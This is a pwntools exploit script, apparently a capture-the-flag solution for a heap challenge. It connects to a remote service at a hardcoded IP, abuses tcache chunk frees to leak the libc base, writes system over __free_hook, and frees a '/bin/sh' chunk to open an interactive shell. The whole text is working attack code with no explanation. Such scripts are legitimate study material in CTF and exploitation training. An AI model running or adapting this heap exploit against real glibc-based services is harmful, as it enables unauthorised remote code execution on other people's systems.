from pwn import*
def menu(ch):
	p.sendlineafter('>>',str(ch))
def new():
	menu(1)
def show(index):
	menu(2)
	p.sendlineafter('?',str(index))
def edit(index,size,content):
	menu(3)
	p.sendlineafter('?',str(index))
	p.sendlineafter(':',str(size))
	p.sendafter(':',content)
def free(index):
	menu(4)
	p.sendlineafter('?',str(index))
p = process('./main')
p = remote('47.111.104.169',57303)
libc =ELF('./libc-2.27.so')
for i in range(10):
	new()
for i in range(9,2,-1):
	free(i)

free(0)
free(1)
free(2)

for i in range(7):
	new()
new()
new()
new()

free(8)

for i in range(6):
	free(i)
free(7)
for i in range(6):
	new()
new() # 7 TARGET
edit(7,0xF8,'FMYY')

for i in range(7):
	free(i)
free(9)

for i in range(7):
	new()
new()
show(7)

libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 0x60
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
new() #9

for i in range(5):
	free(i)
free(7)
free(9)

new()
edit(0,0xF0,p64(free_hook))
new()
edit(1,0xF0,'/bin/sh')
new()
edit(2,0xF0,p64(system))
free(1)
p.interactive()
